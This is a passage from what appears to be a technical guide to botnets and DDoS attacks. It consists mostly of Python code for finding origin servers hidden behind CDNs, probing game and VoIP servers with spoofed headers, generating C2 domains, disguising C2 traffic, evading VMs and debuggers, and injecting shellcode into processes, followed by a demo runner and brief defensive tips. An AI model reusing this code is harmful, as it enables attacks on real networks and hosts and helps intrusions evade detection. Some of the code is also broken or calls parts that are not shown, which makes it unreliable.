        
        origin_ip = None
        
        # Method 1: Historical DNS
        # Use SecurityTrails, VirusTotal, etc.
        try:
            import sublist3r
            subdomains = sublist3r.main(
                target_domain, 40,
                f'{target_domain}_subdomains.txt',
                ports=None, silent=True, verbose=False,
                enable_bruteforce=False, engines=None
            )
            
            # Check each subdomain for Cloudflare
            for sub in subdomains:
                try:
                    answers = dns.resolver.resolve(sub, 'A')
                    for rdata in answers:
                        ip = str(rdata)
                        # Check if IP is Cloudflare
                        if not self._is_cloudflare_ip(ip):
                            print(f"[+] Found potential origin: {sub} -> {ip}")
                            origin_ip = ip
                            break
                except:
                    continue
                    
        except:
            pass
            
        # Method 2: MX records
        try:
            answers = dns.resolver.resolve(target_domain, 'MX')
            for rdata in answers:
                mx_host = str(rdata.exchange)
                # Resolve MX host
                mx_ips = socket.gethostbyname_ex(mx_host)[2]
                for ip in mx_ips:
                    if not self._is_cloudflare_ip(ip):
                        print(f"[+] Found origin via MX: {ip}")
                        origin_ip = ip
        except:
            pass
            
        # Method 3: SPF records
        try:
            answers = dns.resolver.resolve(target_domain, 'TXT')
            for rdata in answers:
                txt = str(rdata)
                if 'v=spf1' in txt:
                    # Extract IPs from SPF
                    import re
                    ips = re.findall(r'ip4:([0-9.]+)', txt)
                    for ip in ips:
                        print(f"[+] Found IP in SPF: {ip}")
        except:
            pass
            
        return origin_ip
        
    def _is_cloudflare_ip(self, ip: str) -> bool:
        """Check if IP belongs to Cloudflare"""
        # Cloudflare IP ranges
        cf_ranges = [
            '173.245.48.0/20',
            '103.21.244.0/22',
            '103.22.200.0/22',
            '103.31.4.0/22',
            '141.101.64.0/18',
            '108.162.192.0/18',
            '190.93.240.0/20',
            '188.114.96.0/20',
            '197.234.240.0/22',
            '198.41.128.0/17',
            '162.158.0.0/15',
            '104.16.0.0/13',
            '104.24.0.0/14',
            '172.64.0.0/13',
            '131.0.72.0/22',
        ]
        
        import ipaddress
        ip_obj = ipaddress.ip_address(ip)
        
        for cf_range in cf_ranges:
            if ip_obj in ipaddress.ip_network(cf_range):
                return True
                
        return False
        
    def akamai_bypass(self, target: str) -> Optional[str]:
        """
        Akamai Bypass
        
        Similar to Cloudflare - find origin server
        Akamai uses different IP ranges
        """
        # Akamai IP ranges
        akamai_ranges = [
            '23.32.0.0/11',
            '23.64.0.0/14',
            '23.0.0.0/12',
            '104.64.0.0/10',
        ]
        
        # Same techniques as Cloudflare
        return self._find_origin_ip(target, akamai_ranges)
        
    def game_server_bypass(self, target_ip: str, target_port: int) -> dict:
        """
        Game Server DDoS Protection Bypass
        
        Common protections:
        - TCP/UDP proxies (like TCPShield)
        - Source query filtering
        
        Bypass methods:
        1. Protocol-specific attacks that proxies don't handle
        2. Connection exhaustion on proxy layer
        3. Find backend through information leakage
        """
        
        bypass_info = {}
        
        # Check for common game server proxies
        # TCPShield, Cloudflare Spectrum, etc.
        
        # Method: Query server for info
        # Many game protocols respond to queries with server info
        
        # Minecraft query
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # Minecraft query handshake
            handshake = b'\xFE\xFD' + b'\x09' + b'\x00' * 4 + b'\x00' * 4
            sock.sendto(handshake, (target_ip, target_port))
            
            response, addr = sock.recvfrom(1024)
            
            # Parse response for real server info
            if response:
                bypass_info['minecraft'] = self._parse_minecraft_response(response)
                
        except:
            pass
            
        # Source engine query (CS:GO, TF2, etc.)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_UDP)
            sock.settimeout(5)
            
            # A2S_INFO query
            query = b'\xFF\xFF\xFF\xFF\x54Source Engine Query\x00'
            sock.sendto(query, (target_ip, target_port))
            
            response, addr = sock.recvfrom(1400)
            
            if response:
                bypass_info['source_engine'] = self._parse_source_response(response)
                
        except:
            pass
            
        return bypass_info
        
    def voip_bypass(self, target_ip: str) -> dict:
        """
        VoIP DDoS Protection Bypass
        
        VoIP uses SIP protocol (UDP 5060)
        RTP for media (UDP high ports)
        
        Bypass methods:
        1. SIP INVITE flood (registers as valid traffic)
        2. RTP flood (bypasses SIP layer)
        3. Reflection via SIP proxies
        """
        
        bypass_info = {}
        
        # SIP OPTIONS probe
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # Build SIP OPTIONS request
            call_id = ''.join(random.choices('0123456789abcdef', k=16))
            cseq = random.randint(1, 1000)
            
            sip_request = f"""OPTIONS sip:{target_ip} SIP/2.0
Via: SIP/2.0/UDP {self._random_ip()}:5060;branch=z9hG4bK{call_id}
From: <sip:test@{self._random_ip()}>
To: <sip:{target_ip}>
Call-ID: {call_id}@{self._random_ip()}
CSeq: {cseq} OPTIONS
Contact: <sip:test@{self._random_ip()}>
Max-Forwards: 70
User-Agent: Test
Content-Length: 0

"""
            
            sock.sendto(sip_request.encode(), (target_ip, 5060))
            
            response, addr = sock.recvfrom(4096)
            
            if response:
                # Parse Server header for software/version
                bypass_info['sip_server'] = self._parse_sip_server(response)
                bypass_info['allowed_methods'] = self._parse_allow_header(response)
                
        except:
            pass
            
        return bypass_info
        
    def _random_ip(self) -> str:
        """Generate random IP for spoofing"""
        return '.'.join(str(random.randint(1, 254)) for _ in range(4))
        
    def _parse_sip_server(self, response: bytes) -> str:
        """Extract Server header from SIP response"""
        for line in response.decode().split('\n'):
            if line.startswith('Server:'):
                return line.split(':', 1)[1].strip()
        return 'Unknown'
        
    def cdn_real_ip_finder(self, target: str) -> List[str]:
        """
        Comprehensive origin IP finder
        
        Combines multiple techniques to find real server IP
        behind CDN/proxy
        """
        origins = []
        
        # 1. Censys/Shodan search for SSL cert
        # Search for certificate hash
        
        # 2. Zone transfer attempt
        try:
            import dns.zone
            z = dns.zone.from_xfr(dns.query.xfr(target, 'ns1.' + target))
            for name, node in z.nodes.items():
                for rdataset in node.rdatasets:
                    for rdata in rdataset:
                        if hasattr(rdata, 'address'):
                            origins.append(str(rdata.address))
        except:
            pass
            
        # 3. Favicon hash matching
        # Calculate favicon hash and search on Shodan
        
        # 4. Content-based matching
        # Get page content, search for unique strings
        
        # 5. SSL certificate Subject Alternative Names
        # May contain origin subdomains
        
        return list(set(origins))
5. Stealth and Evasion Mechanisms
python
#!/usr/bin/env python3
"""
Stealth and Evasion Mechanisms for Botnets

Goal: Avoid detection by:
- Network monitoring (IDS/IPS)
- Endpoint detection (EDR)
- Behavioral analysis
- Traffic analysis
"""

import random
import time
import socket
import struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class StealthCommunications:
    """
    Stealthy C2 Communication Techniques
    """
    
    def __init__(self):
        self.jitter_range = (0.8, 1.2)  # ±20% timing variation
        
    def domain_generation_algorithm(self, seed: int, date: int, 
                                    tld_list: List[str]) -> List[str]:
        """
        Domain Generation Algorithm (DGA)
        
        Generates pseudo-random domains based on seed and date
        Both bot and C2 can generate same list independently
        
        Benefits:
        - No hardcoded domains (harder to block)
        - Daily domain rotation
        - Only need to register one domain per day
        
        Common DGAs:
        - Conficker: Uses date + seed
        - Cryptolocker: Uses date + seed + custom PRNG
        - Matsnu: Uses dictionary words
        """
        
        domains = []
        
        # Simple DGA: seed + date as RNG seed
        import random
        rng = random.Random(seed + date)
        
        for _ in range(1000):  # Generate 1000 candidates
            length = rng.randint(10, 20)
            
            # Generate random domain name
            domain = ''.join(
                chr(rng.randint(97, 122))  # a-z
                for _ in range(length)
            )
            
            tld = rng.choice(tld_list)
            domains.append(f"{domain}.{tld}")
            
        return domains
        
    def beacon_jitter(self, base_interval: int) -> float:
        """
        Add randomization to beacon timing
        
        Prevents detection via regular intervals
        """
        jitter = random.uniform(*self.jitter_range)
        return base_interval * jitter
        
    def protocol_mimicry(self, data: bytes, protocol: str) -> bytes:
        """
        Mimic legitimate protocol
        
        Wrap C2 data in HTTP, DNS, or other protocol format
        """
        
        if protocol == 'http':
            # Wrap in HTTP request
            http_request = f"""POST /api/v2/telemetry HTTP/1.1
Host: cdn.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json
Content-Length: {len(data)}
Connection: keep-alive

"""
            return http_request.encode() + data
            
        elif protocol == 'dns':
            # Encode in DNS query format
            # Base32 encode and split into labels
            encoded = base64.b32encode(data).decode().replace('=', '')
            labels = '.'.join(encoded[i:i+63] for i in range(0, len(encoded), 63))
            return labels.encode()
            
        return data
        
    def steganographic_c2(self, image_path: str, data: bytes) -> bytes:
        """
        Hide C2 data in image using steganography
        
        LSB steganography in PNG images
        """
        from PIL import Image
        import io
        
        img = Image.open(image_path)
        
        # Convert to RGB if necessary
        if img.mode != 'RGB':
            img = img.convert('RGB')
            
        pixels = list(img.getdata())
        
        # Convert data to bits
        data_bits = ''.join(format(b, '08b') for b in data)
        data_bits += '00000000'  # Null terminator
        
        # Embed in LSB
        new_pixels = []
        bit_idx = 0
        
        for pixel in pixels:
            r, g, b = pixel
            
            if bit_idx < len(data_bits):
                r = (r & 0xFE) | int(data_bits[bit_idx])
                bit_idx += 1
            if bit_idx < len(data_bits):
                g = (g & 0xFE) | int(data_bits[bit_idx])
                bit_idx += 1
            if bit_idx < len(data_bits):
                b = (b & 0xFE) | int(data_bits[bit_idx])
                bit_idx += 1
                
            new_pixels.append((r, g, b))
            
        img.putdata(new_pixels)
        
        # Save to bytes
        output = io.BytesIO()
        img.save(output, format='PNG')
        return output.getvalue()

class EvasionTechniques:
    """
    Anti-Analysis and Evasion Techniques
    """
    
    def __init__(self):
        self.sandbox_indicators = []
        
    def anti_vm_check(self) -> bool:
        """
        Detect if running in virtual machine
        """
        checks = []
        
        # Check CPUID hypervisor bit
        try:
            import cpuid
            regs = cpuid.CPUID(1)
            hypervisor_bit = (regs[2] >> 31) & 1
            checks.append(hypervisor_bit == 1)
        except:
            pass
            
        # Check MAC address prefixes
        import uuid
        mac = uuid.getnode()
        mac_str = ':'.join(f'{(mac >> i) & 0xff:02x}' 
                          for i in range(40, -1, -8))
        
        vm_macs = ['00:0c:29', '00:50:56', '08:00:27', '52:54:00']
        checks.append(any(mac_str.startswith(vm) for vm in vm_macs))
        
        # Check for VM-specific files
        vm_files = [
            '/usr/bin/VBoxService',
            '/usr/bin/vmware-toolbox',
            'C:\\Windows\\System32\\drivers\\vmmouse.sys',
        ]
        checks.append(any(os.path.exists(f) for f in vm_files))
        
        return any(checks)
        
    def anti_debug_check(self) -> bool:
        """
        Detect if being debugged
        """
        import ctypes
        
        # Windows IsDebuggerPresent
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
            
        # CheckRemoteDebuggerPresent
        remote = ctypes.c_bool(False)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.c_void_p(-1), ctypes.byref(remote)
        )
        
        return remote.value
        
    def timing_evasion(self):
        """
        Detect emulation via timing analysis
        """
        import time
        
        # Measure execution time of known operation
        start = time.perf_counter()
        
        # CPU intensive operation
        sum = 0
        for i in range(10000000):
            sum += i
            
        elapsed = time.perf_counter() - start
        
        # Emulators are typically 10x+ slower
        if elapsed > 1.0:  # Expected ~0.1s on real hardware
            # Likely emulated
            pass
            
    def code_injection_evasion(self, target_pid: int, shellcode: bytes):
        """
        Inject code with evasion techniques
        
        Methods:
        1. Process hollowing (replace legitimate executable)
        2. APC (Asynchronous Procedure Call) injection
        3. Thread hijacking
        4. Section mapping (NtMapViewOfSection)
        """
        
        # Method: APC Injection
        # Queue APC to thread in target process
        
        # Open target process
        PROCESS_ALL_ACCESS = 0x1F0FFF
        hProcess = ctypes.windll.kernel32.OpenProcess(
            PROCESS_ALL_ACCESS, False, target_pid
        )
        
        # Allocate memory
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        
        addr = ctypes.windll.kernel32.VirtualAllocEx(
            hProcess, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        
        # Write shellcode
        ctypes.windll.kernel32.WriteProcessMemory(
            hProcess, addr, shellcode, len(shellcode), None
        )
        
        # Get thread ID
        # Queue APC
        # NtQueueApcThread
        
    def network_evasion(self, packet: bytes) -> bytes:
        """
        Evade network detection
        
        Techniques:
        - Fragmentation
        - Encoding/encryption
        - Protocol obfuscation
        """
        
        # IP fragmentation to bypass simple packet inspection
        # Split packet into fragments
        
        # Or use custom encoding
        encoded = bytes([b ^ 0xAA for b in packet])
        
        return encoded
6. Proof of Concepts
python
#!/usr/bin/env python3
"""
Complete Proof of Concept Implementations
"""

import asyncio
import random
import time

class CompletePOC:
    """
    Working demonstrations of concepts from this document
    """
    
    @staticmethod
    def dga_demo():
        """
        Demonstrate Domain Generation Algorithm
        """
        stealth = StealthCommunications()
        
        # Generate domains for today
        import datetime
        today = int(datetime.datetime.now().timestamp() / 86400)
        
        domains = stealth.domain_generation_algorithm(
            seed=0x12345678,
            date=today,
            tld_list=['com', 'net', 'org', 'info']
        )
        
        print(f"[*] Generated {len(domains)} domains for today")
        print(f"[+] Sample domains:")
        for domain in domains[:10]:
            print(f"    {domain}")
            
    @staticmethod
    async def botnet_c2_demo():
        """
        Demonstrate botnet C2 communication
        """
        # Start C2 server
        c2 = CentralizedC2(host='127.0.0.1', port=8443)
        
        # Simulate bot registration
        bot_beacon = {
            'uuid': 'test-bot-001',
            'hostname': 'victim-pc',
            'os': 'Windows',
            'arch': 'x64',
            'priv': 'admin',
            'caps': ['ddos', 'keylogger', 'spread']
        }
        
        print("[*] Simulating bot registration...")
        print(f"[+] Bot capabilities: {bot_beacon['caps']}")
        
        # Demonstrate task assignment
        task = {
            'action': 'ddos',
            'params': {
                'target': '192.168.1.100',
                'method': 'syn_flood',
                'duration': 60
            },
            'required_caps': ['ddos']
        }
        
        print(f"[*] Task assigned: {task['action']}")
        print(f"[+] Target: {task['params']['target']}")
        
    @staticmethod
    def ddos_attack_demo():
        """
        Demonstrate DDoS attack structure
        """
        ddos = DDoSAttack()
        
        target = "192.168.1.100"
        port = 80
        
        print(f"[*] DDoS Attack Configuration:")
        print(f"    Target: {target}:{port}")
        print(f"    Methods available:")
        print(f"      - UDP Flood")
        print(f"      - SYN Flood")
        print(f"      - HTTP Flood")
        print(f"      - Slowloris")
        print(f"      - DNS Amplification")
        
        # Show amplification potential
        print(f"\n[*] Amplification Attack Potential:")
        print(f"    DNS: ~10-100x amplification")
        print(f"    NTP: ~10x amplification")
        print(f"    Memcached: ~10,000-51,000x amplification")
        
    @staticmethod
    def bypass_demo():
        """
        Demonstrate DDoS bypass techniques
        """
        bypass = DDoSBypass()
        
        print("[*] DDoS Bypass Techniques:")
        print("[+] Cloudflare bypass:")
        print("    - Historical DNS records")
        print("    - Subdomain enumeration")
        print("    - MX/SPF record analysis")
        
        print("\n[+] Game server bypass:")
        print("    - Protocol-specific attacks")
        print("    - Query-based origin discovery")
        
        print("\n[+] VoIP bypass:")
        print("    - SIP INVITE flooding")
        print("    - RTP direct flooding")

# Run demonstrations
if __name__ == '__main__':
    poc = CompletePOC()
    
    print("=" * 60)
    print("BOTNET AND DDoS PROOF OF CONCEPTS")
    print("=" * 60)
    
    print("\n--- DGA Demo ---")
    poc.dga_demo()
    
    print("\n--- C2 Demo ---")
    asyncio.run(poc.botnet_c2_demo())
    
    print("\n--- DDoS Demo ---")
    poc.ddos_attack_demo()
    
    print("\n--- Bypass Demo ---")
    poc.bypass_demo()
Summary
Component	Key Techniques
Botnet Architecture	Centralized (IRC/HTTP), P2P (Kademlia DHT), Hybrid
C2 Channels	HTTPS, DNS, SMTP, Blockchain, Social Media, Steganography
DDoS Volumetric	UDP flood, ICMP flood, Spoofed SYN
DDoS Protocol	SYN flood, ACK/RST flood, Fragmentation
DDoS Application	HTTP flood, Slowloris, RUDY, LOIC
DDoS Amplification	DNS (10-100x), NTP (10x), Memcached (10,000-51,000x)
Bypass Techniques	Origin IP discovery, Protocol abuse, Rate limit evasion
Stealth	DGA, Jitter, Protocol mimicry, Encryption, Anti-VM
Defensive Recommendations:

Implement SYN cookies for SYN flood protection
Use anycast for DDoS absorption
Deploy WAF with rate limiting and behavioral analysis
Monitor for DGA patterns (high entropy domains)
Implement egress filtering (prevent spoofing)
Use DNSSEC to prevent DNS amplification abuse
Deploy network segmentation to contain bot infections
This knowledge is essential for security researchers, SOC analysts, and network defenders to understand and mitigate modern botnet and DDoS threats.